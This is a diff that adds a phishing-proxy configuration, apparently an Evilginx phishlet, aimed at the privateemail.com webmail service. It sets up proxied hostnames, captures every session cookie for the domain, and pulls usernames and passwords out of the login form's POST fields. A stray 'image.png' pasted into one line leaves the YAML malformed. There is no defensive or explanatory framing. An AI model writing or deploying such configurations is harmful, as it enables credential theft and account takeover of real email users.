@@ -1,0 +1,25 @@
+author: '@Rohan-Cpunk'
+min_ver: '2.3.1'
+
+proxy_hosts:
+  - {phish_sub: '', orig_sub: '', domain: 'privateemail.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'privateemail.com', session: true, is_landing: false, auto_filter: true}
+
+sub_filters: []
+
+auth_tokens:
+  - domain: 'privateemail.com'image.png
+    keys: ['.*']
+
+credentials:
+  username:
+    key: 'login'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'privateemail.com'
+  path: '/appsuite/'
